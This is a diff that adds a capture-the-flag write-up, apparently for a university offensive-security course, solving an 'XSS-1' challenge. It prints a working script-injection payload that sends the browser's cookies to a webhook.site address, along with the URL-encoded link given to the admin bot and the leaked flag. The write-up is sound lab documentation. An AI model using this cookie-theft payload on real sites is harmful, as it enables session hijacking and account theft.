@@ -74,4 +74,52 @@ Then I logged in the the "admin" and leaked password, and the description displa
 ```python
 Description: flag{y0u_h4v3_n0w_4cc3ss_t0_nucl34r_w34p0n_0000000000000000}
 ```
+## Challenge - XSS-1
+```
+Get admin's cookie
 
+admin bot:
+
+http://offsec-chalbroker.osiris.cyber.nyu.edu:1509
+
+website:
+
+http://offsec-chalbroker.osiris.cyber.nyu.edu:10003
+```
+![img.png](admin_bot.png)
+![img.png](website_name.png)
+
+This was pretty interesting to figure out. I'll admin, it took me a while to see how to leak the flag, but I finally got it. I had all the right tools, just not using them properly.
+
+The idea here is that the admin page would hit a website you gave it. Originally, I was sending it to a webhook page I had created, but the was giving me nothing. Then I used the following payload in the main challenge page for the name:
+
+Attack payload: 
+```
+<script>var xhr=new XMLHttpRequest();xhr.open('GET','https://webhook.site/bf88a9f7-174c-4b1e-8c6e-cc8f35f5ca5b/'+document.cookie,false);xhr.send();</script>
+```
+
+This called my webhook site, but it only gave me the information I already had available to me. After much thinking and experimenting, I finally knew what I had to do. I had to get the admin site to call my webhook site through the main challenge page. By giving the admin site the URL for /greet and using my payload, it would hit the main challenge page then leak it's cookies to the webhook site.
+
+Here's how I made it happen. First, I went to the main challenge site and entered my attack script as the name. This sent a payload to my webhook site as expected:
+
+```python
+https://webhook.site/bf88a9f7-174c-4b1e-8c6e-cc8f35f5ca5b/_ga_FYRV1HFMZK=GS1.1.1746287048.6.0.1746287048.0.0.0;%20CHALBROKER_USER_ID=nam10102
+```
+
+But that was only to give me the URL to input to the admin page. I grabbed this out from burp:
+
+```python
+http://offsec-chalbroker.osiris.cyber.nyu.edu:10003/greet?name=%3Cscript%3Evar+xhr%3Dnew+XMLHttpRequest%28%29%3Bxhr.open%28%27GET%27%2C%27https%3A%2F%2Fwebhook.site%2Fbf88a9f7-174c-4b1e-8c6e-cc8f35f5ca5b%2F%27%2Bdocument.cookie%2Cfalse%29%3Bxhr.send%28%29%3B%3C%2Fscript%3E
+```
+
+I entered this as the URL for the admin bot, and when it called the /greet page it leaked its cookie information to the webhook site:
+
+```python
+https://webhook.site/bf88a9f7-174c-4b1e-8c6e-cc8f35f5ca5b/flag=flag%7BS33_XSS_1snt_s0_h4rd_1s_1t?_3ac8e9cd93202178}
+```
+
+A little URL decoding using CyberChef and I got:
+
+````python
+flag=flag{S33_XSS_1snt_s0_h4rd_1s_1t?_3ac8e9cd93202178}
+````
